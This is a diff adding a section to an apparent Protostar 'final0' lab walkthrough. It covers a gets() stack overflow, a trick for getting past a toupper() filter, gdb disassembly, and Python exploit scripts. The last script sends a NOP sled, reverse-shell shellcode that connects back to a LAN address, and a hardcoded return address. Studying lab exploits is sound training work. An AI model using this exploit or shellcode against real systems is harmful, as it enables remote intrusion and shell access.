@@ -226,8 +226,136 @@ And the first thing that we should do is definitely try to run this.\
 Output: `ekate`\
 `No such user EKATE`
 
+Okay. So what we have here? we have the buffer of 512 chars that overwrites with the `gets()` (we already know that \
+it isn't secure enough). We need to open shell. BUT there are one interesting thing -- in the get_username \
+all `\r` and `\n` are replaced by NULL and, after that there is `toupper()` function that produces issues.\
+Why? Because instructions of the shell prompt have chars that can be modified by `toupper()`, and it's\
+will break our instructions.
+
+Never might, still have to bound the buffer to overwrite the return point.\
+We can find it out with gdb.\
+`gdb final0`\
+Disassemble main function: `disas main`\
+Output:\
+```commandline
+...
+0x08049874 <main+65>:   call   0x804975a <get_username> 
+0x08049879 <main+70>:   mov    %eax,0x1c(%esp) 
+0x0804987d <main+74>:   mov    $0x8049c7b,%eax ; NO SUCH USER MESSAGE
+0x08049882 <main+79>:   mov    0x1c(%esp),%edx
+0x08049886 <main+83>:   mov    %edx,0x4(%esp)
+0x0804988a <main+87>:   mov    %eax,(%esp)
+0x0804988d <main+90>:   call   0x8048bac <printf@plt> ; ouput something
+...
+```
+
+Great, so let's move to the get_username function and check what happens inside:\
+`disas get_username`\
+Output:\
+```commandline
+...
+0x08049764 <get_username+10>:   movl   $0x200,0x8(%esp) ; buffer size (512)
+0x0804976c <get_username+18>:   movl   $0x0,0x4(%esp) ; value to fill the buffer 
+0x08049774 <get_username+26>:   lea    -0x210(%ebp),%eax ; actually buffer
+...
+; and here it is out vulnerability:
+0x08049782 <get_username+40>:   lea    -0x210(%ebp),%eax ; buffer
+0x08049788 <get_username+46>:   mov    %eax,(%esp)
+0x0804978b <get_username+49>:   call   0x8048aac <gets@plt> ; get user input
+...
+```
+
+'Cause of the protostar have broken sudo dependencies, and we cannot install any additional utility\
+we decided to use following facts
+- `gets()` can be terminated by using `0xa` or `EOF`, (that will allow as to add null bytes and `0xd` in the middle)
+- the loop for uppercase username uses `strlen()` to locate end of the buffer (this function based on the terminating null byte)
+
+Thus, if we were to place the 0xd or 0x0 bytes somewhere before\
+the beginning of the shellcode, we would effectively terminate\
+the upper-case loop at that point. \
+
+BUT, because of 0xa is used to terminate gets() input we are stuck with having this byte at the very end and \
+must not use it anywhere else in the payload.
+
+Let's check if our tricks will have some result.\
+Small code reference here:
+```python
+import sys, socket
+from struct import pack, unpack
+from binascii import hexlify
+
+HOST = sys.argv[1]
+PORT = 2995
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+packet = "iphelix\x0d" + "a"*500 + "\x0a"
+print hexlify(packet)  # print packet in hex
+
+s.sendall(packet)
+
+data = s.recv(1024)
+print "%s" % data    # print the confirmation
+
+s.close()
+```
+
+Then move back to the /opt/protostar/bin and check the status of final0:\
+`ps aux | grep final0`\
+Okay now we know the id of the process -- `1496`
+Now we can move to the running final with attaching to current process:
+`su`\
+`gdb ./final0 -p 1496`
 
 
+
+
+
+
+
+
+`nano /tmp/break_server.py`\
+Code: \
+```python
+from socket import *
+
+s = socket()
+# connect to server
+s.connect(("127.0.0.1", 2995))
+# overflow buffer
+s.send("A"*532 + "B"*4)
+s.close()
+```
+
+Go to /tmp and run out script ***break_server.py*** with debugger\
+with enabled report of all current processes
+` ps aux | gdb final0`\
+now we can debug the result: \
+`gdb -q -c core.11.final0.2075`\
+Where -c -- corresponds as flag to process core file and -q -- quiet set up\
+`x/20x $esp-0x228`
+Now we get the address of the return
+
+```python
+import socket
+
+#http://www.shell-storm.org/shellcode/files/shellcode-883.php
+shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89" \
+"\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x38\x66\x66\x68\x05\x39\x43" \
+"\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59" \
+"\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68" \
+"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
+
+s = socket.socket()
+s.connect(("192.168.0.102",2995))
+
+
+payload = "oops\r" + "\x90"*100 + shellcode + "\x90"*(532 - len(shellcode) - 100 - 5) + "\x80\xfa\xff\xbf" + "\n"
+
+s.send(payload)
+print(s.recv(1024))
+s.close()
+```
 
 
 
